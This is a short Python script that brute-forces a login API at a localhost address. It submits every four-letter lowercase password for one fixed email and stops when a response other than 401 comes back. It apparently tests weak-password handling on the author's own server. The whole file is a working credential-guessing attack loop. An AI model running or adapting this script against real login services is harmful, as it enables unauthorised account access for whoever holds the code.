import itertools
import requests

# Define your endpoint URL
url = "http://localhost:3333/api/auth/login"

# Define your authorization token

# Define your headers with the authorization token
headers = {
    "Content-Type": "application/json"
}

# Define your request parameters (if any)


# Make the API call with requests library
# response = requests.get(url, headers=headers, params=params)
# print(response.text)
# password = 'a91Pso' # The password to crack
password_length = 4


combinationslower = itertools.product("abcdefghijklmnopqrstuvwxyz", repeat=password_length)
# combinationsDigit = itertools.product("0123456789", repeat=password_length)


# Iterate through all combinations and check if they match the password
count = 0
for guess in combinationslower:
    guess = ''.join(guess)
    params = {
     "email" : "slechtwachtwoord@gmail.com",
     "password": guess
    }
    response = requests.post(url, headers=headers, json=params)
    count = count + 1
    print(count)
    print(response.text)
    if response.status_code != 401:
        print(response.text)
        break